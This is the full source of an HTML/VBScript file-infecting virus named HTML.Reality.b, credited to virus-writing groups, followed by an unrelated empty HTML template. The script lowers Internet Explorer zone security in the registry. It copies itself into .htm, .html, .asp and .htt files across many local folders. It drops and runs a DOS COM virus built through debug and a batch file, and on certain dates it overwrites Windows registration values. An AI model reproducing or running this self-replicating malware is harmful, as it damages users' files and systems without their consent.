<!--Reality-->
<html><body>

<SCRIPT language=VBScript><!--
' ------------------------------------------------
' HTML.Reality.b 
' by -KD- [Metaphase VX Team & NoMercyVirusTeam]
' Technology used from Code Breakers
' Thanks to Buz[FS] for Microbuz 1.0
' ------------------------------------------------
On Error Resume Next
if location.protocol = "file:" then
 Randomize
 Set WshShell = CreateObject("WScript.Shell")
 WshShell.Regwrite"HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\0\1201" , 0, "REG_DWORD"
 WshShell.RegWrite"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\0\1201" , 0, "REG_DWORD"
  if location.protocol = "file:" then
	Set FSO = CreateObject("Scripting.FileSystemObject")
	HPath = Replace(location.href, "/", "\")
	HPath = Replace(HPath, "file:\\\", "")
	HPath = FSO.GetParentFolderName(HPath)
	Set TRange = document.body.createTextRange
	Call GetFolder(HPath)
	Call GetFolder("C:\My Documents")
	Call GetFolder("C:\Windows\Desktop")
	Call GetFolder("C:\Windows\Web")
	Call GetFolder("C:\Windows\Web\Wallpaper")
	Call GetFolder("C:\Windows\Help")
	Call GetFolder("C:\Windows\Temp")
	Call GetFolder("C:\Program Files\Internet Explorer\Connection Wizard")
	Call GetFolder("C:\Program Files\Microsoft Office\Office\Headers")
	Call GetFolder("C:\Inetpub\wwwroot")
  end if
 if Int((2 * Rnd) + 1) = 1 then
	Set ScrFile = FSO.CreateTextFile("c:\Windows\buz.dll", 2, False)
	ScrFile.WriteLine ""
	ScrFile.WriteLine "N MICROBUZ.COM"
	ScrFile.WriteLine "E 0100 E9 03 00 CD 20 00 E8 00 00 5E 83 EE 07 BF 00 01"
	ScrFile.WriteLine "E 0110 A5 A4 33 C9 8E C1 BF 03 02 38 0D 74 1E B1 7C 2E"
	ScrFile.WriteLine "E 0120 F3 A4 BE 84 00 56 26 A5 26 A5 5F B8 3C 00 AB B0"
	ScrFile.WriteLine "E 0130 20 AB 32 C0 B4 42 33 C9 99 CD 21 C3 E9 00 00 80"
	ScrFile.WriteLine "E 0140 FC 4B 75 3D 60 1E B8 02 3D CD 21 93 0E 1F B4 3F"
	ScrFile.WriteLine "E 0150 B9 03 00 51 99 CD 21 87 F2 AC 3C E9 74 21 3C 4D"
	ScrFile.WriteLine "E 0160 74 1D B0 02 E8 CD FF A3 39 00 B4 40 B1 7F 99 CD"
	ScrFile.WriteLine "E 0170 21 E8 BE FF B4 40 59 8A 16 39 00 B4 3E CD 21 1F"
	ScrFile.WriteLine "E 0180 61 EA"
	ScrFile.WriteLine "RCX"
	ScrFile.WriteLine "82"
	ScrFile.WriteLine "W"
	ScrFile.WriteLine "Q"
	ScrFile.WriteLine ""
	ScrFile.Close
	Set BatFile = FSO.CreateTextFile("c:\Windows\WinStart.bat", 2, False)
	BatFile.WriteLine ""
	BatFile.WriteLine "@echo off"
	BatFile.WriteLine "debug < c:\windows\buz.dll > nul"
	BatFile.WriteLine "c:\microbuz.com"
	BatFile.WriteLine ""
	BatFile.Close
	Set RealLink = WshShell.CreateShortcut("C:\WINDOWS\Favorites\HTML.Reality.a.URL")
	RealLink.TargetPath = "http://www.avp.tm/"
	RealLink.Save
 End If
  If Day(Now()) = 15 or Day(Now()) = 30 or Day(Now()) = 5 Then
  	  WshShell.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Version", "Windows 3.1"
  	  WshShell.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RegisteredOwner", "We seem to be made to suffer."
  	  WshShell.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RegisteredOrganization", "It's our lot in life. -cp3o"
  End If
End If
Sub GetFolder(InfPath)
On Error Resume Next
if FSO.FolderExists(InfPath) then
	Do
	 Set FolderObj = FSO.GetFolder(InfPath)
	 InfPath = FSO.GetParentFolderName(InfPath)
	 Set FO = FolderObj.Files
	 For each target in FO
		ExtName = lcase(FSO.GetExtensionName(target.Name))
		if ExtName = "htt" or ExtName = "asp" or ExtName = "htm" or ExtName = "html" then
			Set Real = FSO.OpenTextFile(target.path, 1, False)
			if Real.readline <> "<!--Reality-->" then
				Real.close()
				GetFile(target.path)
			else
				Real.close()
			end if
		end if
	 next
	Loop Until FolderObj.IsRootFolder = True
end if
End Sub

Sub GetFile(GetFileName)
	Set Real = FSO.OpenTextFile(GetFileName, 1, False)
	FileContents = Real.ReadAll()
	Real.close()
	Set Real = FSO.OpenTextFile(GetFileName, 2, False)
	Real.WriteLine "<!--Reality-->"
	Real.Write("<html><body>" + Chr(13) + Chr(10))
	Real.WriteLine TRange.htmlText
	Real.WriteLine("</body></html>")
	Real.Write(FileContents)
	Real.close()
End Sub

--></SCRIPT>
</body></html>
'--------------------------------------Begin code--------------------------
<html>
<head>
<meta name="GENERATOR" content="SAPIEN Technologies PrimalScript 3.1">
<title>Document Title</title>
</head>
<body>
<!-- Insert HTML here -->
</body>
</html>
'--------------------------------------End code ---------------------------